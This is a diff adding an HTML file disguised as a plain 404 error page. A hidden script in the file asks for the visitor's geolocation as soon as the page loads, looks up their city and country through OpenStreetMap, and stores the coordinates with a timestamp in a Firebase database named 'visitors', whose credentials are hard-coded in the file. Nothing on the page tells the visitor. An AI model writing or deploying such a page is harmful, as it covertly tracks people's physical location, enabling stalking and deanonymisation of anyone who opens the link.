@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><title>404 – Page Not Found</title>
+<style>
+  body { margin:0; padding:0; font:16px Arial; display:flex; justify-content:center; align-items:center; height:100vh; background:#f4f4f4 }
+  .container{text-align:center}
+  h1{font-size:5rem; color:#333;}
+  p{font-size:1.5rem; color:#666;}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>404</h1>
+  <p>Sorry, the page you're looking for doesn't exist.</p>
+</div>
+<!-- Firebase App (core) -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+  import {
+    getFirestore, collection, addDoc
+  } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBdYr1CeJXg1X7YPJys0URtOwGY-j9vEhc",
+    authDomain: "visitors-75360.firebaseapp.com",
+    projectId: "visitors-75360",
+    storageBucket: "visitors-75360.firebasestorage.app",
+    messagingSenderId: "190071527092",
+    appId: "1:190071527092:web:fd5c58ac0063e2f3d2e9e1"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+  
+  async function logLocation({ coords }) {
+    const lat = coords.latitude, lon = coords.longitude;
+    const ts = new Date().toISOString();
+    const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+    const geo = await resp.json();
+    const city = geo.address.village||geo.address.town||geo.address.city||"";
+    const country = geo.address.country||"";
+
+    await addDoc(collection(db, "location"), {
+      timestamp: ts, lat, lon, city, country
+    });
+  }
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(logLocation, console.warn);
+  }
+</script>
+
+</body>
+</html>
